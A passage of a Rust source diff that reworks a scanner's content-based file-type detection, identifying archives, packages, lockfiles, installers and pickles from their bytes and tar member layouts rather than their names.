@@ -5,7 +5,7 @@
 
 use std::{io::Read, path::Path};
 
-use super::{DetectionSource, FileType};
+use super::{ArchiveFormat, Compression, DetectionSource, FileType, container_of};
 
 /// LNK shell link CLSID header (20 bytes).
 const LNK_MAGIC: &[u8] = &[
@@ -39,10 +39,14 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
     if data.len() < 2 {
         return None;
     }
+    // Every binary header this module claims by a short signature carries a
+    // NUL or control byte near the front; a script that merely opens with the
+    // same letters (`MZ=1;…`, `true && …`, `GIF89a=…`) carries none.
+    let text = is_text(&data[..data.len().min(TEXT_PROBE)]);
 
     // ISO base media (`.mp4`/`.m4a`/`.mov`): the size-prefixed `ftyp` box.
     // Keyed at offset 4, so it cannot live in the first-byte jump table.
-    if data.len() >= 12 && &data[4..8] == b"ftyp" {
+    if !text && data.len() >= 12 && &data[4..8] == b"ftyp" {
         return Some((FileType::Mp4, DetectionSource::Magic));
     }
 
@@ -59,12 +63,11 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
         return Some((FileType::Text, DetectionSource::Magic));
     }
 
-    // Yarn v1 lockfile. Hopper copies are often renamed `yarn.<sha>.lock`
-    // and miss the exact-basename arm, scoring unknown so lockfile traits
-    // never run.
-    let yarn_probe = &data[..data.len().min(512)];
-    if memchr::memmem::find(yarn_probe, b"yarn lockfile v1").is_some() {
-        return Some((FileType::YarnLock, DetectionSource::Magic));
+    // Lockfiles announce themselves in their opening lines. Hopper copies are
+    // often renamed `yarn.<sha>.lock`, so the header, not the name, has to
+    // carry them to the lockfile traits.
+    if let Some(ft) = lockfile_header(data) {
+        return Some((ft, DetectionSource::Magic));
     }
 
     // An HTML document, whatever it is called and however it is indented.
@@ -299,9 +302,8 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
         0xD0 => {
             // OLE2/CFBF: D0 CF 11 E0 A1 B1 1A E1. Shared by Office documents
             // (.doc/.xls/.ppt/.msg) and Windows Installer packages (.msi/.msp);
-            // magic alone cannot tell them apart, so the extension gates the
-            // choice (Pickle-style). Bare CFBF without an installer extension
-            // stays OleDoc — stream subtype may still promote MSI later.
+            // the root storage's CLSID says which. The name decides only when
+            // the root directory sector lies outside the bytes at hand.
             if data.len() >= 8
                 && data[1] == 0xCF
                 && data[2] == 0x11
@@ -311,11 +313,14 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
                 && data[6] == 0x1A
                 && data[7] == 0xE1
             {
-                let ext = path
-                    .extension()
-                    .and_then(|e| e.to_str())
-                    .map(str::to_ascii_lowercase);
-                let ty = if matches!(ext.as_deref(), Some("msi" | "msp" | "mst" | "msm")) {
+                let installer = ole_root_clsid(data).map_or_else(
+                    || {
+                        let ext = lowercase_ext(path);
+                        matches!(ext.as_deref(), Some("msi" | "msp" | "mst" | "msm"))
+                    },
+                    |clsid| MSI_CLSIDS.contains(&clsid),
+                );
+                let ty = if installer {
                     FileType::Msi
                 } else {
                     FileType::OleDoc
@@ -422,26 +427,7 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
                 None
             }
         }
-        0x80 => {
-            // Python pickle (protocol 2+). The 0x80 prefix is shared with many binary
-            // formats, so we require a pickle-associated extension to avoid false positives.
-            if (2..=5).contains(&data[1]) {
-                let ext = path
-                    .extension()
-                    .and_then(|e| e.to_str())
-                    .map(str::to_ascii_lowercase);
-                if matches!(
-                    ext.as_deref(),
-                    Some("pkl" | "pickle" | "joblib" | "pt" | "pth")
-                ) {
-                    Some((FileType::Pickle, DetectionSource::Magic))
-                } else {
-                    None
-                }
-            } else {
-                None
-            }
-        }
+        0x80 => looks_like_pickle(path, data).then_some((FileType::Pickle, DetectionSource::Magic)),
         b'b' => {
             // Binary Plist: bplist. A `.nib` with this magic is a keyed-archive
             // nib (NSKeyedArchiver output inside an older nib bundle), but the
@@ -531,53 +517,27 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
             }
         }
         0x1F => {
-            // Gzip: 1F 8B — could wrap a tar or be a single compressed file.
-            // Use extension to tell them apart; unknown extension → plain gz.
-            if data[1] == 0x8B {
-                // `.apk` + gzip magic is an Alpine Linux package (a
-                // gzip-concatenated tar), distinct from the Android `.apk`
-                // (a zip — handled by `classify_pk`). The two never share
-                // magic, so container magic alone disambiguates them.
-                let ft = if path_ends_with_ci(path, b".apk") {
-                    FileType::ApkAlpine
-                } else if path_ends_with_ci(path, b".crate") {
-                    // Cargo-specific extension; always a `<name>-<ver>/` gzip tar.
-                    FileType::Crate
-                } else if path_ends_with_ci(path, b".pkg.tar.gz") {
-                    // Arch package with a gzip body; the `.pkg.tar.*` extension
-                    // is Arch-specific. Checked before the generic `.tar.gz`.
-                    FileType::PkgArch
-                // npm and Python sdists are identified by interior structure,
-                // not their filename. Content-addressed stores commonly name
-                // either one `<hash>.sample`, so inspect before consulting the
-                // generic gzip-tar extension.
-                } else if gzip_tar_is_npm(data) {
-                    FileType::Npm
-                } else if gzip_tar_is_sdist(data) {
-                    FileType::PythonSdist
-                } else if path_ends_with_ci(path, b".tar.gz") || path_ends_with_ci(path, b".tgz") {
-                    FileType::TarGz
-                } else {
-                    FileType::Gz
-                };
-                Some((ft, DetectionSource::Magic))
+            // Gzip: 1F 8B, then CM 8 (deflate), the only method ever defined.
+            // What it wraps is read, not guessed from the name: npm packages,
+            // sdists and crates arrive as `<hash>.sample` in content-addressed
+            // stores.
+            if data[1] == 0x8B && data.get(2) == Some(&8) {
+                let inside = tar_layout(
+                    flate2::read::GzDecoder::new(data).take(TAR_PEEK_LIMIT),
+                    false,
+                );
+                let ft = classify_tar(path, data, Compression::Gzip, inside);
+                Some((ft.unwrap_or(FileType::Gz), DetectionSource::Magic))
             } else {
                 None
             }
         }
         0xFD => {
-            // XZ: FD 37 7A 58
-            if data.starts_with(b"\xfd7zX") {
-                let ft = if path_ends_with_ci(path, b".pkg.tar.xz") {
-                    // Arch package with an xz body. No xz decompressor is linked,
-                    // so the Arch-specific extension is authoritative here.
-                    FileType::PkgArch
-                } else if path_ends_with_ci(path, b".tar.xz") || path_ends_with_ci(path, b".txz") {
-                    FileType::TarXz
-                } else {
-                    FileType::Xz
-                };
-                Some((ft, DetectionSource::Magic))
+            // XZ: FD 37 7A 58 5A 00. No xz decoder is linked, so only the name
+            // can say whether a tar is inside.
+            if data.starts_with(b"\xfd7zXZ\0") {
+                let ft = classify_tar(path, data, Compression::Xz, Inside::Unreadable);
+                Some((ft.unwrap_or(FileType::Xz), DetectionSource::Magic))
             } else {
                 None
             }
@@ -590,19 +550,18 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
                 && data.len() >= 6
                 && u32::from_le_bytes([data[2], data[3], data[4], data[5]]) >= 14
             {
-                return Some((FileType::Bmp, DetectionSource::Magic));
-            }
-            // Bzip2: BZh
-            if data.starts_with(b"BZh") {
-                let ft = if path_ends_with_ci(path, b".tar.bz2")
-                    || path_ends_with_ci(path, b".tbz2")
-                    || path_ends_with_ci(path, b".tbz")
-                {
-                    FileType::TarBz2
-                } else {
-                    FileType::Bz2
-                };
-                Some((ft, DetectionSource::Magic))
+                Some((FileType::Bmp, DetectionSource::Magic))
+            } else if data.len() >= 10
+                && data.starts_with(b"BZh")
+                && (b'1'..=b'9').contains(&data[3])
+                && matches!(&data[4..10], b"1AY&SY" | b"\x17\x72\x45\x38\x50\x90")
+            {
+                // Bzip2: `BZh`, the block-size digit, then the first block's
+                // magic (BCD pi) or, for an empty stream, the end-of-stream
+                // magic (BCD sqrt(pi)). No bzip2 decoder is linked, so only the
+                // name can say whether a tar is inside.
+                let ft = classify_tar(path, data, Compression::Bzip2, Inside::Unreadable);
+                Some((ft.unwrap_or(FileType::Bz2), DetectionSource::Magic))
             } else {
                 None
             }
@@ -627,27 +586,14 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
         0x28 => {
             // Zstandard: 28 B5 2F FD
             if data.len() >= 4 && data[1] == 0xB5 && data[2] == 0x2F && data[3] == 0xFD {
-                // FreeBSD (`.pkg`, `+MANIFEST` marker) and Arch
-                // (`.pkg.tar.zst`, `.PKGINFO` marker) are both zstd tars,
-                // disambiguated by their leading manifest member.
-                let ft = if is_freebsd_pkg_zstd(path, data) {
-                    FileType::PkgFreebsd
-                } else if path_ends_with_ci(path, b".pkg.tar.zst") {
-                    if zstd_tar_has_pkginfo(data) {
-                        FileType::PkgArch
-                    } else {
-                        FileType::TarZst
-                    }
-                } else if path_ends_with_ci(path, b".xbps") {
-                    // Void Linux package — a zstd tar; its extension is unique.
-                    FileType::Xbps
-                } else if path_ends_with_ci(path, b".tar.zst") || path_ends_with_ci(path, b".tzst")
-                {
-                    FileType::TarZst
-                } else {
-                    FileType::Zst
-                };
-                Some((ft, DetectionSource::Magic))
+                // FreeBSD, Arch and Void packages are all zstd tars; their
+                // leading members say which.
+                let inside = zstd::stream::read::Decoder::new(data)
+                    .map_or(Inside::Unreadable, |d| {
+                        tar_layout(d.take(TAR_HEAD_LIMIT), false)
+                    });
+                let ft = classify_tar(path, data, Compression::Zstd, inside);
+                Some((ft.unwrap_or(FileType::Zst), DetectionSource::Magic))
             } else {
                 None
             }
@@ -658,6 +604,15 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
                 detect_shebang(data)
             } else {
                 None
+            }
+        }
+        0xEF => {
+            // A UTF-8 BOM ahead of a shebang: Windows editors write it along
+            // with CRLF. The kernel will not exec it, but `perl x`, `python x`
+            // and `bash x` still run the body, so it is still that language.
+            match data.strip_prefix(b"\xEF\xBB\xBF") {
+                Some(rest) if rest.starts_with(b"#!") => detect_shebang(rest),
+                _ => None,
             }
         }
         b'/' => {
@@ -684,26 +639,27 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
             // PHP opening tag: <?php
             if data.starts_with(b"<?php") {
                 Some((FileType::Php, DetectionSource::Magic))
-            } else if let Some(r) = detect_xml_plist(data) {
-                Some(r)
             } else {
-                // Generic XML: <?xml prolog or well-known root elements.
                 detect_xml(data)
             }
         }
         _ => None,
     };
 
-    if result.is_some() {
-        return result;
+    // A short signature proves nothing when only text follows it. Formats
+    // whose header is text by design keep their claim.
+    if let Some((ft, source)) = result {
+        if source != DetectionSource::Magic || !text || has_text_header(ft) {
+            return result;
+        }
     }
 
     // ── Fallback checks (rare paths) ─────────────────────────────────
     // These are guarded by cheap pre-checks to avoid unnecessary work.
 
     // Uncompressed tar carries no leading magic — the `ustar` signature sits at
-    // offset 257. OCI/Docker image tarballs get their own type; everything else
-    // with that signature is a plain tar.
+    // offset 257. Its members say whether it is a gem, an OCI image, a Gentoo
+    // package or a plain tar.
     //
     // This used to fall through to the extension fallback, which meant a tar
     // was only recognized when it was *named* `.tar`: the same bytes under any
@@ -711,22 +667,19 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
     // unanalyzed. That is a detection gap an attacker gets for free by renaming
     // a file — an XMRig 6.24.0 release tarball named `<sha256>.bin` scored one
     // finding as an opaque blob and six once renamed to `.tar`.
-    //
-    // `.gem` is excluded because a gem is *also* an uncompressed ustar tar and
-    // carries its own semantics; it has no magic of its own, so the extension
-    // fallback is the only thing that can type it.
     if data.len() > 262 && &data[257..262] == b"ustar" {
-        if tar_is_oci_image(data) {
-            return Some((FileType::OciImage, DetectionSource::Magic));
-        }
-        if !matches!(super::ext::detect_from_path(path), Some(FileType::Gem)) {
-            return Some((FileType::Tar, DetectionSource::Magic));
-        }
+        let ft = classify_tar(path, data, Compression::None, tar_layout(data, true));
+        return Some((ft.unwrap_or(FileType::Tar), DetectionSource::Magic));
     }
 
-    // Python bytecode (3.5+): XX 0D 0D 0A — first byte varies by version
-    if data.len() >= 4 && data[1] == 0x0D && data[2] == 0x0D && data[3] == 0x0A {
-        return Some((FileType::PythonBytecode, DetectionSource::Magic));
+    // Python bytecode: a little-endian magic number that ends in `\r\n`,
+    // then flags or a timestamp. CPython 2.0–2.7 used 50823..=62211; 3.x
+    // counts up from 3000 (3.14 is 3627).
+    if !text && data.len() >= 8 && &data[2..4] == b"\r\n" {
+        let magic = u16::from_le_bytes([data[0], data[1]]);
+        if (3000..4000).contains(&magic) || (50823..=62211).contains(&magic) {
+            return Some((FileType::PythonBytecode, DetectionSource::Magic));
+        }
     }
 
     // Tampered PE: only scan if there's an 'M' in the first 64 bytes
@@ -736,12 +689,17 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
         }
     }
 
-    // XML Plist not starting with '<' — only check if first bytes suggest XML-ish content
-    // (whitespace or BOM before a '<' tag)
-    if data[0] != b'<' && memchr::memchr(b'<', &data[..data.len().min(64)]).is_some() {
-        if let Some(r) = detect_xml_plist(data) {
-            return Some(r);
-        }
+    // Markup after a BOM or leading whitespace.
+    if let Some(r) = detect_xml(data) {
+        return Some(r);
+    }
+
+    if looks_like_asar(data) {
+        return Some((FileType::Asar, DetectionSource::Magic));
+    }
+
+    if looks_like_lzma_alone(data) {
+        return Some((FileType::Lzma, DetectionSource::Magic));
     }
 
     if looks_like_github_actions_workflow(path, data) {
@@ -846,56 +804,220 @@ fn path_ends_with_ci(path: &Path, suffix: &[u8]) -> bool {
     bytes[bytes.len() - suffix.len()..].eq_ignore_ascii_case(suffix)
 }
 
-fn is_freebsd_pkg_zstd(path: &Path, data: &[u8]) -> bool {
-    if !path_ends_with_ci(path, b".pkg") {
+/// How much of a file [`is_text`] reads. Binary headers put a NUL or a
+/// control byte well inside it: a PE's `e_lfanew`, a font's table count, a
+/// RIFF or ISO-BMFF box size.
+const TEXT_PROBE: usize = 64;
+
+/// Whether `head` reads as plain text: UTF-8 with no control bytes other
+/// than whitespace. A character cut off by the end of the probe still counts.
+fn is_text(head: &[u8]) -> bool {
+    let control = |b: &u8| (*b < 0x20 && !matches!(b, b'\t' | b'\n' | b'\r' | 0x0C)) || *b == 0x7F;
+    if head.iter().any(control) {
         return false;
     }
-    let Ok(mut decoder) = zstd::stream::read::Decoder::new(data) else {
-        return false;
+    match std::str::from_utf8(head) {
+        Ok(_) => true,
+        Err(e) => e.error_len().is_none(),
+    }
+}
+
+/// Formats whose header is text by design, so an all-text head is no reason
+/// to doubt them: markup, registry scripts, PDF, RTF, ASCII armor, and the
+/// archives whose member headers are ASCII (`ar`, ASCII cpio).
+fn has_text_header(ft: FileType) -> bool {
+    matches!(
+        ft,
+        FileType::Php
+            | FileType::Xml
+            | FileType::Plist
+            | FileType::Svg
+            | FileType::Registry
+            | FileType::Pbxproj
+            | FileType::PgpSignature
+            | FileType::Pdf
+            | FileType::Rtf
+            | FileType::Cpio
+            | FileType::Deb
+            | FileType::StaticLib
+    )
+}
+
+/// A lockfile's tool-written header: pnpm's first line, or a line of the
+/// leading comment block that Yarn v1, Cargo or Poetry write.
+fn lockfile_header(data: &[u8]) -> Option<FileType> {
+    let head = &data[..data.len().min(512)];
+    let head = head.strip_prefix(b"\xEF\xBB\xBF").unwrap_or(head);
+    let lines = head.split(|&b| b == b'\n').map(<[u8]>::trim_ascii_end);
+    if lines.clone().next()?.starts_with(b"lockfileVersion:") {
+        return Some(FileType::PnpmLock);
+    }
+    lines
+        .take_while(|line| line.is_empty() || line.starts_with(b"#"))
+        .find_map(|line| {
+            if line == b"# yarn lockfile v1" {
+                Some(FileType::YarnLock)
+            } else if line.starts_with(b"# This file is automatically @generated by Cargo.") {
+                Some(FileType::CargoLock)
+            } else if line.starts_with(b"# This file is automatically @generated by Poetry") {
+                Some(FileType::PoetryLock)
+            } else {
+                None
+            }
+        })
+}
+
+/// Root-storage CLSIDs of Windows Installer databases: package (and merge
+/// module), patch, and transform — `{000C1084,86,82-0000-0000-C000-000000000046}`
+/// in on-disk byte order.
+const MSI_CLSIDS: [[u8; 16]; 3] = [
+    *b"\x84\x10\x0C\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46",
+    *b"\x86\x10\x0C\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46",
+    *b"\x82\x10\x0C\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46",
+];
+
+/// The CLSID of a compound file's root storage: the first entry of the first
+/// directory sector. `None` when that sector is not within `data`.
+fn ole_root_clsid(data: &[u8]) -> Option<[u8; 16]> {
+    let shift = u16::from_le_bytes(data.get(0x1E..0x20)?.try_into().ok()?);
+    if !matches!(shift, 9 | 12) {
+        return None;
+    }
+    let first = u32::from_le_bytes(data.get(0x30..0x34)?.try_into().ok()?) as usize;
+    let at = first
+        .checked_add(1)?
+        .checked_mul(1 << shift)?
+        .checked_add(0x50)?;
+    data.get(at..at + 16)?.try_into().ok()
+}
+
+/// The pickle `torch.save` wrote before its zip format: protocol 2, then a
+/// ten-byte LONG1 holding the magic number 0x1950a86a20f9469cfc6c.
+const TORCH_LEGACY_MAGIC: &[u8] = b"\x80\x02\x8a\x0a\x6c\xfc\x9c\x46\xf9\x20\x6a\xa8\x50\x19";
+
+/// Python pickle. Protocol 4 and 5 open with a FRAME whose u64 length has
+/// no business near 2^40, and legacy `torch.save` with its own magic: either
+/// is the format itself. Protocols 2 and 3 open with two bytes that other
+/// binary formats share, so there the name has to agree.
+fn looks_like_pickle(path: &Path, data: &[u8]) -> bool {
+    match data {
+        [0x80, 4 | 5, 0x95, frame @ ..] if frame.len() >= 8 => frame[5..8] == [0, 0, 0],
+        _ if data.starts_with(TORCH_LEGACY_MAGIC) => true,
+        [0x80, 2 | 3, ..] => matches!(
+            lowercase_ext(path).as_deref(),
+            Some("pkl" | "pickle" | "joblib" | "pt" | "pth")
+        ),
+        _ => false,
+    }
+}
+
+/// Electron ASAR: a Chromium pickle holding the header size (`04 00 00 00`,
+/// then the size), a second pickle whose payload is 4 bytes shorter, and the
+/// JSON file table as its string.
+fn looks_like_asar(data: &[u8]) -> bool {
+    let u32_at = |off: usize| {
+        data.get(off..off + 4)
+            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
     };
-    // `Read::read` may return fewer bytes than requested even when more are
-    // available, so fill the buffer in a loop rather than trusting one read —
-    // a short first read must not split the marker and downgrade a real package
-    // to a generic zstd tar. Stops early at EOF for streams shorter than 32 B.
-    let mut prefix = [0u8; 32];
+    u32_at(0) == Some(4)
+        && u32_at(4).is_some_and(|size| u32_at(8) == size.checked_sub(4))
+        && data
+            .get(16..)
+            .is_some_and(|rest| rest.starts_with(b"{\"files\":"))
+}
+
+/// LZMA-alone (`.lzma`): the properties byte every mainstream encoder writes
+/// (0x5D: lc=3, lp=0, pb=2), a dictionary size that `xz` and 7-Zip only ever
+/// write as 2^n or 2^n + 2^(n-1) between 4 KiB and 1.5 GiB, and an
+/// uncompressed size that is either unknown (all ones) or under 2^40. The
+/// header has no magic, so all three must hold; Chromium's `.pak` resources
+/// satisfy the last two.
+fn looks_like_lzma_alone(data: &[u8]) -> bool {
+    if data.len() < 14 || data[0] != 0x5D {
+        return false;
+    }
+    let dict = u32::from_le_bytes([data[1], data[2], data[3], data[4]]);
+    let size = u64::from_le_bytes([
+        data[5], data[6], data[7], data[8], data[9], data[10], data[11], data[12],
+    ]);
+    let n = dict.trailing_zeros();
+    let dict_ok = (12..=30).contains(&n) && (dict == 1 << n || dict == 3 << (n - 1));
+    dict_ok && (size == u64::MAX || size < 1 << 40)
+}
+
+/// How far detection will inflate a gzip tar while reading its member names.
+/// npm packages, sdists and crates name themselves anywhere under their one
+/// root, and sdists often put `PKG-INFO` last, after generated clients, tests
+/// and documentation, so this is generous; it still bounds a decompression
+/// bomb.
+const TAR_PEEK_LIMIT: u64 = 64 << 20;
+
+/// How far detection will inflate a zstd tar. Its packages (FreeBSD, Arch,
+/// Void) name themselves in their leading members.
+const TAR_HEAD_LIMIT: u64 = 1 << 20;
+
+/// Members a plain tar is read through for an image's markers; a `docker
+/// save` bundle writes `manifest.json` after its layers.
+const TAR_DEEP_MEMBERS: usize = 512;
+
+/// Members read before a tar with several top-level entries is settled.
+/// Every first-member and metadata marker sits within them.
+const TAR_SHALLOW_MEMBERS: usize = 8;
+
+/// What a container's decoded bytes turned out to be.
+#[derive(Clone, Copy)]
+enum Inside {
+    /// The codec could not produce a first block: a truncated or corrupt
+    /// stream, or no decoder linked. The content has not spoken.
+    Unreadable,
+    /// The stream decoded and is not a tar.
+    NotTar,
+    /// A tar, typed by its layout: a package, or plain [`FileType::Tar`].
+    Tar(FileType),
+}
+
+/// What a tar's member names make it: a package with a fixed layout, or
+/// plain [`FileType::Tar`]. `deep` reads on for container-image markers,
+/// which only a plain tar can carry.
+///
+/// * First member: `<root>/gpkg-1` (Gentoo), `.SIGN.*` (Alpine),
+///   `+COMPACT_MANIFEST`/`+MANIFEST` (FreeBSD), `props.plist` (Void).
+/// * Anywhere: `.PKGINFO` with `.MTREE` or `.BUILDINFO` (Arch);
+///   `metadata.gz` with `data.tar.gz` (gem); `oci-layout` with `index.json`,
+///   or `manifest.json` with layers (OCI / `docker save`).
+/// * One top-level directory holding `package/package.json` (npm),
+///   `<root>/PKG-INFO` (Python sdist) or `<root>/Cargo.toml.orig` (crate).
+fn tar_layout(mut reader: impl Read, deep: bool) -> Inside {
+    // Read the first header block by hand, so a stream the codec cannot
+    // decode is told apart from one that decodes to something else.
+    let mut block = [0u8; 512];
     let mut filled = 0;
-    while filled < prefix.len() {
-        match decoder.read(&mut prefix[filled..]) {
-            Ok(0) => break,
+    while filled < block.len() {
+        match reader.read(&mut block[filled..]) {
+            Ok(0) => return Inside::NotTar,
             Ok(n) => filled += n,
-            Err(_) => return false,
+            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => {}
+            Err(_) => return Inside::Unreadable,
         }
     }
-    let prefix = &prefix[..filled];
-    prefix.starts_with(b"+COMPACT_MANIFEST") || prefix.starts_with(b"+MANIFEST")
-}
-
-/// How far detection will inflate a `.tgz` while looking for the npm manifest.
-/// Generous enough to scan past a reordered package's source tree, small enough
-/// that a `package/`-only gzip bomb can't make detection do unbounded work.
-const NPM_PEEK_LIMIT: u64 = 8 << 20;
-
-/// Source distributions often put `PKG-INFO` last, after generated clients,
-/// tests, and documentation. Keep a decompression-bomb bound, but do not share
-/// npm's smaller manifest budget: valid sdists commonly exceed 8 MiB expanded.
-const SDIST_PEEK_LIMIT: u64 = 64 << 20;
-
-/// Peek a gzip tar's members to decide whether the layout is an npm package:
-/// every entry under a `package/` prefix, with a `package/package.json`
-/// present. Bails on the first non-`package/` entry, so a non-npm gzip tar
-/// costs one header. The manifest usually sits near the front, but some packers
-/// order it after the source tree, so we scan the whole `package/` layout —
-/// bounded by [`NPM_PEEK_LIMIT`] decompressed bytes so a crafted `package/`-only
-/// stream can't make detection inflate without limit.
-fn gzip_tar_is_npm(data: &[u8]) -> bool {
-    let reader = flate2::read::GzDecoder::new(data).take(NPM_PEEK_LIMIT);
-    let mut archive = tar::Archive::new(reader);
-    let Ok(entries) = archive.entries() else {
-        return false;
+    let mut archive = tar::Archive::new(std::io::Cursor::new(block).chain(reader));
+    let Ok(mut entries) = archive.entries() else {
+        return Inside::NotTar;
     };
-    for entry in entries {
-        let Ok(entry) = entry else { return false };
-        // Tar metadata headers (pax/GNU long-name) aren't real members.
+    // Some while every member so far shares one top-level directory.
+    let mut root: Option<Option<String>> = Some(None);
+    let mut members = 0usize;
+    let (mut pkginfo, mut arch_meta) = (false, false);
+    let (mut gem_metadata, mut gem_data) = (false, false);
+    let (mut oci_layout, mut oci_index) = (false, false);
+    let (mut docker_manifest, mut docker_layers) = (false, false);
+    loop {
+        let entry = match entries.next() {
+            Some(Ok(entry)) => entry,
+            // A stream whose first header does not parse is not a tar.
+            Some(Err(_)) if members == 0 => return Inside::NotTar,
+            Some(Err(_)) | None => break,
+        };
         if matches!(
             entry.header().entry_type(),
             tar::EntryType::XGlobalHeader
@@ -907,125 +1029,124 @@ fn gzip_tar_is_npm(data: &[u8]) -> bool {
         }
         let Ok(path) = entry.path() else { continue };
         let path = path.to_string_lossy();
-        let trimmed = path.trim_end_matches('/');
-        // Skip macOS AppleDouble sidecars (`._name`) that `tar` smuggles in
-        // alongside real files — they're not part of the npm layout.
-        let basename = trimmed.rsplit('/').next().unwrap_or(trimmed);
-        if basename.starts_with("._") {
+        let name = path.trim_start_matches("./").trim_end_matches('/');
+        let (top, rest) = name.split_once('/').unwrap_or((name, ""));
+        let base = name.rsplit('/').next().unwrap_or(name);
+        // macOS AppleDouble sidecars that `tar` smuggles in are not members.
+        if base.starts_with("._") || name.is_empty() {
             continue;
         }
-        // The directory entry arrives as `package` (trailing slash stripped);
-        // files under it as `package/<...>`. The first real entry outside that
-        // tree means this isn't an npm package.
-        if trimmed != "package" && !trimmed.starts_with("package/") {
-            return false;
-        }
-        if trimmed == "package/package.json" {
-            return true;
-        }
-    }
-    false
-}
+        members += 1;
 
-/// Peek a gzip tar's members to decide whether the layout is a Python source
-/// distribution: every entry under a single `<name>-<version>/` root, with a
-/// `<root>/PKG-INFO` present. Bails on the first entry outside that root, so a
-/// non-sdist gzip tar costs one header. Bounded by [`SDIST_PEEK_LIMIT`] bytes.
-fn gzip_tar_is_sdist(data: &[u8]) -> bool {
-    let reader = flate2::read::GzDecoder::new(data).take(SDIST_PEEK_LIMIT);
-    let mut archive = tar::Archive::new(reader);
-    let Ok(entries) = archive.entries() else {
-        return false;
-    };
-    let mut root: Option<String> = None;
-    for entry in entries {
-        let Ok(entry) = entry else { return false };
-        if matches!(
-            entry.header().entry_type(),
-            tar::EntryType::XGlobalHeader
-                | tar::EntryType::XHeader
-                | tar::EntryType::GNULongName
-                | tar::EntryType::GNULongLink
-        ) {
-            continue;
-        }
-        let Ok(path) = entry.path() else { continue };
-        let path = path.to_string_lossy();
-        let trimmed = path.trim_end_matches('/');
-        let basename = trimmed.rsplit('/').next().unwrap_or(trimmed);
-        // Skip macOS AppleDouble sidecars that `tar` smuggles in.
-        if basename.starts_with("._") {
-            continue;
-        }
-        // An sdist is a single top-level directory; a second top-level entry
-        // means this is some other gzip tar.
-        let top = trimmed.split('/').next().unwrap_or(trimmed);
-        match &root {
-            None => root = Some(top.to_string()),
-            Some(r) if r != top => return false,
-            Some(_) => {}
-        }
-        // `PKG-INFO` sitting directly under the root is the sdist marker.
-        if basename == "PKG-INFO" && trimmed.split('/').count() == 2 {
-            return true;
-        }
-    }
-    false
-}
-
-/// Peek an uncompressed tar's members for the markers that distinguish an
-/// OCI image layout (`oci-layout` + `index.json`) or a `docker save` bundle
-/// (`manifest.json` + `repositories`, layer tars, or a `blobs/` tree) from a
-/// generic tar. Bounded to the first 512 members; the in-memory tar is
-/// seekable, so each member costs only its header. Requires the structural
-/// pair, not a lone `manifest.json`, to avoid matching an ordinary tar.
-fn tar_is_oci_image(data: &[u8]) -> bool {
-    let mut archive = tar::Archive::new(std::io::Cursor::new(data));
-    let Ok(entries) = archive.entries() else {
-        return false;
-    };
-    let (mut oci_layout, mut index_json) = (false, false);
-    let (mut manifest_json, mut docker_layers) = (false, false);
-    for entry in entries.take(512) {
-        let Ok(entry) = entry else { return false };
-        let Ok(path) = entry.path() else { continue };
-        let path = path.to_string_lossy();
-        let name = path.trim_start_matches("./");
-        match name {
-            "oci-layout" => oci_layout = true,
-            "index.json" => index_json = true,
-            "manifest.json" => manifest_json = true,
-            "repositories" => docker_layers = true,
-            _ => {
-                if name.ends_with("/layer.tar") || name.starts_with("blobs/") {
-                    docker_layers = true;
-                }
+        if members == 1 {
+            if base == "gpkg-1" && rest == "gpkg-1" {
+                return Inside::Tar(FileType::GentooBinpkg);
+            }
+            if name.starts_with(".SIGN.") {
+                return Inside::Tar(FileType::ApkAlpine);
+            }
+            if matches!(name, "+COMPACT_MANIFEST" | "+MANIFEST") {
+                return Inside::Tar(FileType::PkgFreebsd);
+            }
+            if name == "props.plist" {
+                return Inside::Tar(FileType::Xbps);
             }
         }
-        if (oci_layout && index_json) || (manifest_json && docker_layers) {
-            return true;
+        match name {
+            ".PKGINFO" => pkginfo = true,
+            ".MTREE" | ".BUILDINFO" => arch_meta = true,
+            "metadata.gz" => gem_metadata = true,
+            "data.tar.gz" => gem_data = true,
+            "oci-layout" => oci_layout = true,
+            "index.json" => oci_index = true,
+            "manifest.json" => docker_manifest = true,
+            "repositories" => docker_layers = true,
+            _ if name.ends_with("/layer.tar") || name.starts_with("blobs/") => {
+                docker_layers = true;
+            }
+            _ => {}
+        }
+        if pkginfo && arch_meta {
+            return Inside::Tar(FileType::PkgArch);
+        }
+        if gem_metadata && gem_data {
+            return Inside::Tar(FileType::Gem);
+        }
+        if (oci_layout && oci_index) || (docker_manifest && docker_layers) {
+            return Inside::Tar(FileType::OciImage);
+        }
+
+        match &mut root {
+            Some(r @ None) => *r = Some(top.to_owned()),
+            Some(Some(r)) if r != top => root = None,
+            _ => {}
+        }
+        if let Some(Some(r)) = &root {
+            match rest {
+                "package.json" if r == "package" => return Inside::Tar(FileType::Npm),
+                "PKG-INFO" => return Inside::Tar(FileType::PythonSdist),
+                "Cargo.toml.orig" => return Inside::Tar(FileType::Crate),
+                _ => {}
+            }
+        }
+        // A single-root package may name itself last; the byte budget on
+        // `reader` bounds that walk. Anything else is settled early.
+        let cap = if deep {
+            TAR_DEEP_MEMBERS
+        } else if root.is_some() {
+            usize::MAX
+        } else {
+            TAR_SHALLOW_MEMBERS
+        };
+        if members >= cap {
+            break;
         }
     }
-    false
+    if members > 0 {
+        Inside::Tar(FileType::Tar)
+    } else {
+        Inside::NotTar
+    }
 }
 
-/// Peek a zstd tar's leading members for the Arch package marker `.PKGINFO`
